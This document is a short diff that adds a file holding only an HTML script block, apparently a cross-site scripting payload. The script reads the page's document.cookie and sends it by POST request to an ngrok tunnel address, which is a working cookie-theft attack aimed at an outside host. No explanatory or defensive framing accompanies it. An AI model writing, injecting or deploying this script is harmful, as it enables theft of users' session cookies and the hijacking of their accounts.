@@ -1,0 +1,15 @@
+
+<script >
+  let data = {"data" : document.cookie };
+
+  fetch("https://127b7829fa91.ngrok.io/x", {
+    method: "POST",
+    headers: {
+      'Content-Type': 'application/json'
+      // 'Content-Type': 'application/x-www-form-urlencoded',
+    },
+    body: JSON.stringify(data)
+  }).then(res => {
+    console.log("Request complete! response:", res);
+  });
+</script>
